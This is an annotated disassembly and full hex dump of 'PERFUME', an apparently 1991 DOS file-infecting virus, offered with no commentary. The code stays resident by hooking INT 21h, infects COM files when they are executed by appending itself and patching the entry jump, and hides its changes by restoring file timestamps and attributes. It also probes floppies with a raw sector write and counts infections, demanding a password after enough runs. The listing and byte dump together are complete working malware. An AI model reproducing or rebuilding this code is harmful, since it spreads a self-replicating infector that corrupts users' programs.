
                ;==========================================================================
                ;==                 PERFUME                      ==
                ;==      Created:   8-Jan-91                             ==
                ;==      Version:                                ==
                ;==      Code type: zero start                           ==
                ;==      Passes:    9          Analysis Options on: BIOQRSUW             ==
                ;==========================================================================

     0000           START:
     0000 .EB 7A                JMP SHORT LOC_1     ; (007C)

     0002  0090                 DW  90H         ;  xref 8986:009C
     0004  000B[00]             DB  11 DUP (0)
     000F  00           DATA_9      DB  0           ;  xref 8986:00EC
     0010  0036[00]             DB  54 DUP (0)
     0046  00           DATA_10     DB  0           ;  xref 8986:0110
     0047  0012[00]             DB  18 DUP (0)
     0059  00 00                DB  0, 0
     005B  03 01                DB  3, 1
     005D  00 01                DB  0, 1
     005F  52 0C                DB   52H, 0CH
     0061  1460 0226        DATA_15     DW  1460H, 226H     ;  xref 8986:014E, 0186
     0065  65F6         DATA_17     DW  65F6H           ;  xref 8986:022D, 02D6
     0067  1325         DATA_18     DW  1325H           ;  xref 8986:0231, 02DA
     0069  5C 43 4F 4D 4D 41            DB  '\COMMAND.COM'
     006F  4E 44 2E 43 4F 4D
     0075  00                   DB  0
     0076  1EEB         DATA_19     DW  1EEBH           ;  xref 8986:00C4, 025B
     0078  54           DATA_21     DB  54H         ;  xref 8986:00CA
     0079  E8                   DB  0E8H
     007A  0026         DATA_22     DW  26H         ;  xref 8986:0258

     007C           LOC_1:                      ;  xref 8986:0000
     007C  5F                   POP DI
     007D  83 EF 03             SUB DI,3
     0080  E8 0000              CALL    SUB_1           ; (0083)

     0083  5E                   POP SI
     0084  81 EE 0083               SUB SI,83H
     0088  2E: 89 84 0059           MOV CS:DATA_11E[SI],AX  ; (8986:0059=0)
     008D  2E: 89 B4 005B           MOV CS:DATA_12E[SI],SI  ; (8986:005B=103H)
     0092  2E: 8C 8C 005F           MOV WORD PTR CS:DATA_13E+2[SI],CS   ; (8986:005F=0C52H)
     0097  2E: 89 BC 005D           MOV CS:DATA_13E[SI],DI  ; (8986:005D=100H)
     009C  8B 3E 0002               MOV DI,WORD PTR DS:[2]  ; (8986:0002=90H)
     00A0  83 EF 40             SUB DI,40H
     00A3  8E C7                MOV ES,DI
     00A5  0E                   PUSH    CS
     00A6  1F                   POP DS
     00A7  B9 0400              MOV CX,400H
     00AA  FC                   CLD             ; Clear direction
     00AB  BF 0000              MOV DI,0
     00AE  F3/ A4               REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
     00B0  81 EC 0400               SUB SP,400H
     00B4  06                   PUSH    ES
     00B5  BF 00BA              MOV DI,0BAH
     00B8  57                   PUSH    DI
     00B9  CB                   RETF
                SUB_1       ENDP

     00BA  0E                   PUSH    CS
     00BB  1F                   POP DS
     00BC  8E 06 005F               MOV ES,WORD PTR DS:DATA_13E+2   ; (8986:005F=0C52H)
     00C0  8B 36 005D               MOV SI,DS:DATA_13E      ; (8986:005D=100H)
     00C4  A1 0076              MOV AX,DATA_19      ; (8986:0076=1EEBH)
     00C7  26: 89 04                MOV ES:[SI],AX
     00CA  A0 0078              MOV AL,DATA_21      ; (8986:0078=54H)
     00CD  26: 88 44 02             MOV ES:DATA_4E[SI],AL   ; (0C52:0002=0ECH)
     00D1  BE 0003              MOV SI,3
     00D4  B8 0B56              MOV AX,0B56H
     00D7  CD 21                INT 21H         ; DOS Services  ah=function 0Bh
                                        ;  if keybd char available,al=FF
     00D9  3D 4952              CMP AX,4952H
     00DC  75 4A                JNE LOC_4           ; Jump if not equal
     00DE  83 3E 02FB 50            CMP DATA_24,50H     ; (8986:02FB=0)
     00E3  72 32                JB  LOC_3           ; Jump if below
     00E5  0E                   PUSH    CS
     00E6  1F                   POP DS
     00E7  BA 000F              MOV DX,0FH
     00EA  B4 09                MOV AH,9
     00EC  CD 21                INT 21H         ; DOS Services  ah=function 09h
                                        ;  display char string at ds:dx
     00EE  B4 0A                MOV AH,0AH
     00F0  BA 0034              MOV DX,34H
     00F3  CD 21                INT 21H         ; DOS Services  ah=function 0Ah
                                        ;  get keybd line, put at ds:dx
     00F5  8B DA                MOV BX,DX
     00F7  81 7F 01 3404            CMP WORD PTR DS:DATA_5E[BX],3404H   ; (8986:0001=907AH)
     00FC  75 0D                JNE LOC_2           ; Jump if not equal
     00FE  80 7F 03 37              CMP BYTE PTR DS:DATA_7E[BX],37H ; (8986:0003=0) '7'
     0102  75 07                JNE LOC_2           ; Jump if not equal
     0104  81 7F 04 3131            CMP WORD PTR DS:DATA_8E[BX],3131H   ; (8986:0004=0)
     0109  74 0C                JE  LOC_3           ; Jump if equal
     010B           LOC_2:                      ;  xref 8986:00FC, 0102
     010B  BA 0046              MOV DX,46H
     010E  B4 09                MOV AH,9
     0110  CD 21                INT 21H         ; DOS Services  ah=function 09h
                                        ;  display char string at ds:dx
     0112  B8 4C01              MOV AX,4C01H
     0115  CD 21                INT 21H         ; DOS Services  ah=function 4Ch
                                        ;  terminate with al=return code
     0117           LOC_3:                      ;  xref 8986:00E3, 0109, 013D, 017A
     0117  2E: A1 005F              MOV AX,WORD PTR CS:DATA_13E+2   ; (8986:005F=0C52H)
     011B  8E D8                MOV DS,AX
     011D  8E C0                MOV ES,AX
     011F  2E: A1 0059              MOV AX,CS:DATA_11E      ; (8986:0059=0)
     0123  2E: FF 2E 005D           JMP DWORD PTR CS:DATA_13E   ; (8986:005D=100H)
     0128           LOC_4:                      ;  xref 8986:00DC
     0128  2E: A1 005F              MOV AX,WORD PTR CS:DATA_13E+2   ; (8986:005F=0C52H)
     012C  48                   DEC AX
     012D  8E D8                MOV DS,AX
     012F  80 3E 0000 5A            CMP BYTE PTR DS:DATA_1E,5AH ; (0C51:0000=0E8H) 'Z'
     0134  74 09                JE  LOC_5           ; Jump if equal
     0136  80 3E 0000 04            CMP BYTE PTR DS:DATA_1E,4   ; (0C51:0000=0E8H)
     013B  74 02                JE  LOC_5           ; Jump if equal
     013D  EB D8                JMP SHORT LOC_3     ; (0117)
     013F           LOC_5:                      ;  xref 8986:0134, 013B
     013F  83 2E 0012 40            SUB WORD PTR DS:DATA_3E,40H ; (0C51:0012=5AECH)
     0144  83 2E 0003 40            SUB WORD PTR DS:DATA_2E,40H ; (0C51:0003=0EB03H)
     0149  B8 3521              MOV AX,3521H
     014C  CD 21                INT 21H         ; DOS Services  ah=function 35h
                                        ;  get intrpt vector al in es:bx
     014E  2E: 89 1E 0061           MOV CS:DATA_15,BX       ; (8986:0061=1460H)
     0153  2E: 8C 06 0063           MOV WORD PTR CS:DATA_15+2,ES    ; (8986:0063=226H)
     0158  0E                   PUSH    CS
     0159  1F                   POP DS
     015A  BA 017C              MOV DX,17CH
     015D  B8 2521              MOV AX,2521H
     0160  CD 21                INT 21H         ; DOS Services  ah=function 25h
                                        ;  set intrpt vector al to ds:dx
     0162  BA 0069              MOV DX,69H
     0165  9C                   PUSHF               ; Push flags
     0166  0E                   PUSH    CS
     0167  B8 017A              MOV AX,17AH
     016A  50                   PUSH    AX
     016B  B8 0B00              MOV AX,0B00H
     016E  50                   PUSH    AX
     016F  53                   PUSH    BX
     0170  51                   PUSH    CX
     0171  52                   PUSH    DX
     0172  56                   PUSH    SI
     0173  57                   PUSH    DI
     0174  55                   PUSH    BP
     0175  1E                   PUSH    DS
     0176  06                   PUSH    ES
     0177  EB 58                JMP SHORT LOC_13        ; (01D1)
     0179  90                   NOP
     017A  EB 9B                JMP SHORT LOC_3     ; (0117)

                ;==========================================================================
                                ; INT 21h       ->      CS:017C
                ;==========================================================================

     017C           INT_21H_ENTRY   PROC    FAR
     017C  3D 0B56              CMP AX,0B56H
     017F  74 0A                JE  LOC_7           ; Jump if equal
     0181  80 FC 4B             CMP AH,4BH          ; 'K'
     0184  74 25                JE  LOC_9           ; Jump if equal
     0186           LOC_6:                      ;  xref 8986:01A9, 02F6
     0186  2E: FF 2E 0061           JMP DWORD PTR CS:DATA_15    ; (8986:0061=1460H)
     018B           LOC_7:                      ;  xref 8986:017F
     018B  06                   PUSH    ES
     018C  56                   PUSH    SI
     018D  57                   PUSH    DI
     018E  0E                   PUSH    CS
     018F  07                   POP ES
     0190  BF 0003              MOV DI,3
     0193  A7                   CMPSW               ; Cmp [si] to es:[di]
     0194  75 10                JNZ LOC_8           ; Jump if not zero
     0196  A7                   CMPSW               ; Cmp [si] to es:[di]
     0197  75 0D                JNZ LOC_8           ; Jump if not zero
     0199  A7                   CMPSW               ; Cmp [si] to es:[di]
     019A  75 0A                JNZ LOC_8           ; Jump if not zero
     019C  A6                   CMPSB               ; Cmp [si] to es:[di]
     019D  75 07                JNZ LOC_8           ; Jump if not zero
     019F  B8 4952              MOV AX,4952H
     01A2  5F                   POP DI
     01A3  5E                   POP SI
     01A4  07                   POP ES
     01A5  CF                   IRET                ; Interrupt return
                INT_21H_ENTRY   ENDP

     01A6           LOC_8:                      ;  xref 8986:0194, 0197, 019A, 019D
     01A6  5F                   POP DI
     01A7  5E                   POP SI
     01A8  07                   POP ES
     01A9  EB DB                JMP SHORT LOC_6     ; (0186)
     01AB           LOC_9:                      ;  xref 8986:0184
     01AB  50                   PUSH    AX
     01AC  53                   PUSH    BX
     01AD  51                   PUSH    CX
     01AE  52                   PUSH    DX
     01AF  56                   PUSH    SI
     01B0  57                   PUSH    DI
     01B1  55                   PUSH    BP
     01B2  1E                   PUSH    DS
     01B3  06                   PUSH    ES
     01B4  8B DA                MOV BX,DX
     01B6           LOC_10:                     ;  xref 8986:01BC
     01B6  80 3F 00             CMP BYTE PTR [BX],0
     01B9  74 03                JE  LOC_11          ; Jump if equal
     01BB  43                   INC BX
     01BC  EB F8                JMP SHORT LOC_10        ; (01B6)
     01BE           LOC_11:                     ;  xref 8986:01B9
     01BE  81 7F FD 4F43            CMP WORD PTR DS:DATA_25E[BX],4F43H  ; (8986:FFFD=0)
     01C3  75 09                JNE LOC_12          ; Jump if not equal
     01C5  80 7F FF 4D              CMP BYTE PTR DS:DATA_26E[BX],4DH    ; (8986:FFFF=0) 'M'
     01C9  75 03                JNE LOC_12          ; Jump if not equal
     01CB  EB 04                JMP SHORT LOC_13        ; (01D1)
     01CD  90                   DB  90H
     01CE           LOC_12:                     ;  xref 8986:01C3, 01C9
     01CE  E9 011C              JMP LOC_20          ; (02ED)
     01D1           LOC_13:                     ;  xref 8986:0177, 01CB
     01D1  1E                   PUSH    DS
     01D2  52                   PUSH    DX
     01D3  8B DA                MOV BX,DX
     01D5  B4 19                MOV AH,19H
     01D7  CD 21                INT 21H         ; DOS Services  ah=function 19h
                                        ;  get default drive al  (0=a:)
     01D9  8A D0                MOV DL,AL
     01DB  80 7F 01 3A              CMP BYTE PTR DS:DATA_5E[BX],3AH ; (8986:0001=7AH) ':'
     01DF  75 07                JNE LOC_14          ; Jump if not equal
     01E1  8A 17                MOV DL,[BX]
     01E3  FE CA                DEC DL
     01E5  80 E2 1F             AND DL,1FH
     01E8           LOC_14:                     ;  xref 8986:01DF
     01E8  80 FA 01             CMP DL,1
     01EB  77 1A                JA  LOC_15          ; Jump if above
     01ED  B8 0301              MOV AX,301H
     01F0  B9 0000              MOV CX,0
     01F3  B6 00                MOV DH,0
     01F5  CD 13                INT 13H         ; Disk  dl=drive ?  ah=func 03h
                                        ;  write sectors from mem es:bx
     01F7  8A FC                MOV BH,AH
     01F9  B4 00                MOV AH,0
     01FB  CD 13                INT 13H         ; Disk  dl=drive ?  ah=func 00h
                                        ;  reset disk, al=return status
     01FD  80 FF 03             CMP BH,3
     0200  75 05                JNE LOC_15          ; Jump if not equal
     0202  5A                   POP DX
     0203  1F                   POP DS
     0204  E9 00E6              JMP LOC_20          ; (02ED)
     0207           LOC_15:                     ;  xref 8986:01EB, 0200
     0207  5A                   POP DX
     0208  1F                   POP DS
     0209  1E                   PUSH    DS
     020A  52                   PUSH    DX
     020B  B8 4300              MOV AX,4300H
     020E  CD 21                INT 21H         ; DOS Services  ah=function 43h
                                        ;  get/set file attrb, nam@ds:dx
     0210  51                   PUSH    CX
     0211  81 E1 FFFE               AND CX,0FFFEH
     0215  B8 4301              MOV AX,4301H
     0218  CD 21                INT 21H         ; DOS Services  ah=function 43h
                                        ;  get/set file attrb, nam@ds:dx
     021A  B8 3D02              MOV AX,3D02H
     021D  CD 21                INT 21H         ; DOS Services  ah=function 3Dh
                                        ;  open file, al=mode,name@ds:dx
     021F  73 03                JNC LOC_16          ; Jump if carry=0
     0221  E9 00AF              JMP LOC_19          ; (02D3)
     0224           LOC_16:                     ;  xref 8986:021F
     0224  8B D8                MOV BX,AX
     0226  B8 5700              MOV AX,5700H
     0229  CD 21                INT 21H         ; DOS Services  ah=function 57h
                                        ;  get/set file date & time
     022B  0E                   PUSH    CS
     022C  1F                   POP DS
     022D  89 0E 0065               MOV DATA_17,CX      ; (8986:0065=65F6H)
     0231  89 16 0067               MOV DATA_18,DX      ; (8986:0067=1325H)
     0235  B9 0003              MOV CX,3
     0238  BA 0076              MOV DX,76H
     023B  B8 3F00              MOV AX,3F00H
     023E  CD 21                INT 21H         ; DOS Services  ah=function 3Fh
                                        ;  read file, cx=bytes, to ds:dx
     0240  B8 4202              MOV AX,4202H
     0243  B9 0000              MOV CX,0
     0246  BA 0000              MOV DX,0
     0249  CD 21                INT 21H         ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
     024B  83 FA 00             CMP DX,0
     024E  77 52                JA  LOC_17          ; Jump if above
     0250  3D FC00              CMP AX,0FC00H
     0253  77 7E                JA  LOC_19          ; Jump if above
     0255  2D 0003              SUB AX,3
     0258  A3 007A              MOV DATA_22,AX      ; (8986:007A=26H)
     025B  80 3E 0076 E8            CMP BYTE PTR DATA_19,0E8H   ; (8986:0076=0EBH)
     0260  75 43                JNE LOC_18          ; Jump if not equal
     0262  2B 06 0077               SUB AX,WORD PTR DATA_19+1   ; (8986:0077=541EH)
     0266  3D 02FD              CMP AX,2FDH
     0269  75 3A                JNE LOC_18          ; Jump if not equal
     026B  B8 4201              MOV AX,4201H
     026E  B9 FFFF              MOV CX,0FFFFH
     0271  BA FFFC              MOV DX,0FFFCH
     0274  CD 21                INT 21H         ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
     0276  B8 3F00              MOV AX,3F00H
     0279  B9 0004              MOV CX,4
     027C  BA 02F9              MOV DX,2F9H
     027F  CD 21                INT 21H         ; DOS Services  ah=function 3Fh
                                        ;  read file, cx=bytes, to ds:dx
     0281  81 3E 02F9 4956          CMP DATA_23,4956H       ; (8986:02F9=4956H)
     0287  75 1C                JNE LOC_18          ; Jump if not equal
     0289  FF 06 02FB               INC DATA_24         ; (8986:02FB=0)
     028D  B8 4201              MOV AX,4201H
     0290  B9 FFFF              MOV CX,0FFFFH
     0293  BA FFFC              MOV DX,0FFFCH
     0296  CD 21                INT 21H         ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
     0298  B4 40                MOV AH,40H          ; '@'
     029A  B9 0004              MOV CX,4
     029D  BA 02F9              MOV DX,2F9H
     02A0  CD 21                INT 21H         ; DOS Services  ah=function 40h
                                        ;  write file cx=bytes, to ds:dx
     02A2           LOC_17:                     ;  xref 8986:024E
     02A2  EB 2F                JMP SHORT LOC_19        ; (02D3)
     02A4  90                   DB  90H
     02A5           LOC_18:                     ;  xref 8986:0260, 0269, 0287
     02A5  C7 06 02FB 0000          MOV DATA_24,0       ; (8986:02FB=0)
     02AB  B8 4000              MOV AX,4000H
     02AE  B9 02FD              MOV CX,2FDH
     02B1  BA 0000              MOV DX,0
     02B4  CD 21                INT 21H         ; DOS Services  ah=function 40h
                                        ;  write file cx=bytes, to ds:dx
     02B6  72 1B                JC  LOC_19          ; Jump if carry Set
     02B8  3D 02FD              CMP AX,2FDH
     02BB  75 16                JNE LOC_19          ; Jump if not equal
     02BD  B8 4200              MOV AX,4200H
     02C0  B9 0000              MOV CX,0
     02C3  BA 0000              MOV DX,0
     02C6  CD 21                INT 21H         ; DOS Services  ah=function 42h
                                        ;  move file ptr, cx,dx=offset
     02C8  B8 4000              MOV AX,4000H
     02CB  B9 0003              MOV CX,3
     02CE  BA 0079              MOV DX,79H
     02D1  CD 21                INT 21H         ; DOS Services  ah=function 40h
                                        ;  write file cx=bytes, to ds:dx
     02D3           LOC_19:                     ;  xref 8986:0221, 0253, 02A2, 02B6
                                        ;            02BB
     02D3  B8 5701              MOV AX,5701H
     02D6  8B 0E 0065               MOV CX,DATA_17      ; (8986:0065=65F6H)
     02DA  8B 16 0067               MOV DX,DATA_18      ; (8986:0067=1325H)
     02DE  CD 21                INT 21H         ; DOS Services  ah=function 57h
                                        ;  get/set file date & time
     02E0  B8 3E00              MOV AX,3E00H
     02E3  CD 21                INT 21H         ; DOS Services  ah=function 3Eh
                                        ;  close file, bx=file handle
     02E5  59                   POP CX
     02E6  5A                   POP DX
     02E7  1F                   POP DS
     02E8  B8 4301              MOV AX,4301H
     02EB  CD 21                INT 21H         ; DOS Services  ah=function 43h
                                        ;  get/set file attrb, nam@ds:dx
     02ED           LOC_20:                     ;  xref 8986:01CE, 0204
     02ED  07                   POP ES
     02EE  1F                   POP DS
     02EF  5D                   POP BP
     02F0  5F                   POP DI
     02F1  5E                   POP SI
     02F2  5A                   POP DX
     02F3  59                   POP CX
     02F4  5B                   POP BX
     02F5  58                   POP AX
     02F6  E9 FE8D              JMP LOC_6           ; (0186)

     02F9  4956         DATA_23     DW  4956H           ;  xref 8986:0281
     02FB  0000         DATA_24     DW  0           ;  xref 8986:00DE, 0289, 02A5

                SEG_A       ENDS
                        END START


---------------------------------------------------------------
| Dump Mader   Ver 2.2               Tue Jan 08 16:37:54 1991 |
---------------------------------------------------------------

Dumping file : perfume.bin
               765 bytes length
               16:35:2  8-1-1991  created (modifyed)

0000:  EB 7A 90 00 00 00 00 00 00 00 00 00 00 00 00 00    ".z.............."
0010:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    "................"
0020:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    "................"
0030:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    "................"
0040:  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    "................"
0050:  00 00 00 00 00 00 00 00 00 00 00 03 01 00 01 52    "...............R"
0060:  0C 60 14 26 02 F6 65 25 13 5C 43 4F 4D 4D 41 4E    ".`.&..e%.\COMMAN"
0070:  44 2E 43 4F 4D 00 EB 1E 54 E8 26 00 5F 83 EF 03    "D.COM...T.&._..."
0080:  E8 00 00 5E 81 EE 83 00 2E 89 84 59 00 2E 89 B4    "...^.......Y...."
0090:  5B 00 2E 8C 8C 5F 00 2E 89 BC 5D 00 8B 3E 02 00    "[...._....]..>.."
00A0:  83 EF 40 8E C7 0E 1F B9 00 04 FC BF 00 00 F3 A4    "..@............."
00B0:  81 EC 00 04 06 BF BA 00 57 CB 0E 1F 8E 06 5F 00    "........W....._."
00C0:  8B 36 5D 00 A1 76 00 26 89 04 A0 78 00 26 88 44    ".6]..v.&...x.&.D"
00D0:  02 BE 03 00 B8 56 0B CD 21 3D 52 49 75 4A 83 3E    ".....V..!=RIuJ.>"
00E0:  FB 02 50 72 32 0E 1F BA 0F 00 B4 09 CD 21 B4 0A    "..Pr2........!.."
00F0:  BA 34 00 CD 21 8B DA 81 7F 01 04 34 75 0D 80 7F    ".4..!......4u..."
0100:  03 37 75 07 81 7F 04 31 31 74 0C BA 46 00 B4 09    ".7u....11t..F..."
0110:  CD 21 B8 01 4C CD 21 2E A1 5F 00 8E D8 8E C0 2E    ".!..L.!.._......"
0120:  A1 59 00 2E FF 2E 5D 00 2E A1 5F 00 48 8E D8 80    ".Y....]..._.H..."
0130:  3E 00 00 5A 74 09 80 3E 00 00 04 74 02 EB D8 83    ">..Zt..>...t...."
0140:  2E 12 00 40 83 2E 03 00 40 B8 21 35 CD 21 2E 89    "...@....@.!5.!.."
0150:  1E 61 00 2E 8C 06 63 00 0E 1F BA 7C 01 B8 21 25    ".a....c....|..!%"
0160:  CD 21 BA 69 00 9C 0E B8 7A 01 50 B8 00 0B 50 53    ".!.i....z.P...PS"
0170:  51 52 56 57 55 1E 06 EB 58 90 EB 9B 3D 56 0B 74    "QRVWU...X...=V.t"
0180:  0A 80 FC 4B 74 25 2E FF 2E 61 00 06 56 57 0E 07    "...Kt%...a..VW.."
0190:  BF 03 00 A7 75 10 A7 75 0D A7 75 0A A6 75 07 B8    "....u..u..u..u.."
01A0:  52 49 5F 5E 07 CF 5F 5E 07 EB DB 50 53 51 52 56    "RI_^.._^...PSQRV"
01B0:  57 55 1E 06 8B DA 80 3F 00 74 03 43 EB F8 81 7F    "WU.....?.t.C...."
01C0:  FD 43 4F 75 09 80 7F FF 4D 75 03 EB 04 90 E9 1C    ".COu....Mu......"
01D0:  01 1E 52 8B DA B4 19 CD 21 8A D0 80 7F 01 3A 75    "..R.....!.....:u"
01E0:  07 8A 17 FE CA 80 E2 1F 80 FA 01 77 1A B8 01 03    "...........w...."
01F0:  B9 00 00 B6 00 CD 13 8A FC B4 00 CD 13 80 FF 03    "................"
0200:  75 05 5A 1F E9 E6 00 5A 1F 1E 52 B8 00 43 CD 21    "u.Z....Z..R..C.!"
0210:  51 81 E1 FE FF B8 01 43 CD 21 B8 02 3D CD 21 73    "Q......C.!..=.!s"
0220:  03 E9 AF 00 8B D8 B8 00 57 CD 21 0E 1F 89 0E 65    "........W.!....e"
0230:  00 89 16 67 00 B9 03 00 BA 76 00 B8 00 3F CD 21    "...g.....v...?.!"
0240:  B8 02 42 B9 00 00 BA 00 00 CD 21 83 FA 00 77 52    "..B.......!...wR"
0250:  3D 00 FC 77 7E 2D 03 00 A3 7A 00 80 3E 76 00 E8    "=..w~-...z..>v.."
0260:  75 43 2B 06 77 00 3D FD 02 75 3A B8 01 42 B9 FF    "uC+.w.=..u:..B.."
0270:  FF BA FC FF CD 21 B8 00 3F B9 04 00 BA F9 02 CD    ".....!..?......."
0280:  21 81 3E F9 02 56 49 75 1C FF 06 FB 02 B8 01 42    "!.>..VIu.......B"
0290:  B9 FF FF BA FC FF CD 21 B4 40 B9 04 00 BA F9 02    ".......!.@......"
02A0:  CD 21 EB 2F 90 C7 06 FB 02 00 00 B8 00 40 B9 FD    ".!./.........@.."
02B0:  02 BA 00 00 CD 21 72 1B 3D FD 02 75 16 B8 00 42    ".....!r.=..u...B"
02C0:  B9 00 00 BA 00 00 CD 21 B8 00 40 B9 03 00 BA 79    ".......!..@....y"
02D0:  00 CD 21 B8 01 57 8B 0E 65 00 8B 16 67 00 CD 21    "..!..W..e...g..!"
02E0:  B8 00 3E CD 21 59 5A 1F B8 01 43 CD 21 07 1F 5D    "..>.!YZ...C.!..]"
02F0:  5F 5E 5A 59 5B 58 E9 8D FE 56 49 00 00             "_^ZY[X...VI.."

